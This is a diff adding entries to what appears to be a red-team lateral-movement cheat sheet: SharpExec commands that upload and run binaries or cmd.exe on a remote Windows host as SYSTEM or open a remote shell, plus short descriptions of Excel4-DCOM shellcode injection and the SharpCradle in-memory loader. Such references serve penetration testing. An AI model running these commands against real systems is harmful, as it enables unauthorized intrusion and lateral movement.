@@ -163,4 +163,52 @@ PowerShell Remoting over SSH
     Enter-PSSession -Hostname <IP or FQDN> -Username james -SSHTransport
 ```    
 
+#### [SharpExec](https://github.com/anthemtotheego/SharpExec)
+
+Examples 
+========
+
+Note - All modules require Administrative rights on the target systems
+Note - If the user who runs SharpExec has administrative rights to the target system, username/password/domain options on not required.
+
+PSExec Module:
+
+Uploads file from User1's desktop to C:\ on remote system and executes it as NT Authority\System
+
+```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```
+
+Runs command via cmd.exe on target system as NT Authority\System
+
+```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```
+
+WMI Module:
+
+Uploads file from User1's desktop to C:\ on remote system and executes it as TargetUser
+
+```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```
+
+Runs command via cmd.exe on target system as TargetUser
+
+```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```
+
+WMIExec Module:
+
+Starts semi-interactive shell on remote system as TargetUser
+
+```SharpExec.exe -m=wmiexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain```
+
+
+#### Excel4-DCOM
+
+[Excel4-DCOM](https://github.com/outflanknl/Excel4-DCOM)
+
+PowerShell and Cobalt Strike scripts for lateral movement using Excel 4.0 / XLM macros via DCOM (direct shellcode injection in Excel.exe).
+
+
+#### SharpCradle
+
+[SharpCradle](https://github.com/anthemtotheego/SharpCradle.git)
+
+SharpCradle is a tool designed to help penetration testers or red teams download and execute .NET binaries into memory.
+
 
